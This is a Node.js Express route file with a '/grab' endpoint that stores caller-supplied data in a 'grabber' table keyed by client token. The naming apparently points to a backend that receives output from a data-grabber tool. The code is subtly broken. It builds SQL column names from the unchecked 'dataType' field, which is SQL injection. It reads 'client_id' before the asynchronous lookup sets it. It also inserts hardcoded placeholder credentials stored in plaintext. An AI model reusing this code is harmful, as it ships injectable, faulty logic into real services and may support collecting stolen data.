const express = require("express");
const db = require("../../database");
const router = express.Router();
const { generateToken } = require("../../service/utils.js");

router.post("/grab", (req, res) => {
  const { token } = req.query || generateToken();
  const { dataType, data } = req.body;

  const userSQL = "SELECT client_id FROM clients WHERE token=?";
  let client_id;
  db.get(userSQL, [token], (err, row) => {
    if (err) {
      return res.status(400).json({ error: err.message });
    }

    if (row) {
      client_id = row.client_id;
    } else {
      return res.status(400).json({ error: "Invalid token" });
    }
  });

  // Check if the user exists in the 'grabber' table
  const grabberSQL = "SELECT * FROM grabber WHERE client_id=?";
  db.get(grabberSQL, [client_id], (err, row) => {
    if (err) {
      return res.status(400).json({ error: err.message });
    }

    if (row) {
      // User exists, update the data
      const updateSQL = `UPDATE grabber SET ${dataType}=? WHERE client_id=?`;
      db.run(updateSQL, [data, client_id], (err) => {
        if (err) {
          return res.status(400).json({ error: err.message });
        }

        return res.json({ message: "Data updated successfully" });
      });
    } else {
      // User does not exist, create a new entry in 'grabber' and 'clients' tables
      const insertGrabberSQL =
        "INSERT INTO grabber (client_id, " + dataType + ") VALUES (?, ?)";
      db.run(insertGrabberSQL, [client_id, data], (err) => {
        if (err) {
          return res.status(400).json({ error: err.message });
        }

        // Insert into the 'clients' table with necessary data
        const clientData = {
          name: "John Doe", // Replace with actual data
          email: "john.doe@example.com",
          password: "password123",
          company: "Company Inc.",
          bio: "Bio information",
          role: "User",
          token: token,
          has_grabber: 1, // Indicate that the user has a grabber
          last_active: new Date().toUTCString(),
        };

        const insertClientSQL =
          "INSERT INTO clients (name, email, password, company, bio, role, token, has_grabber, last_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)";
        const insertClientParams = Object.values(clientData);

        db.run(insertClientSQL, insertClientParams, (err) => {
          if (err) {
            return res.status(400).json({ error: err.message });
          }

          return res.json({ message: "New entry created successfully" });
        });
      });
    }
  });
});

module.exports = router;
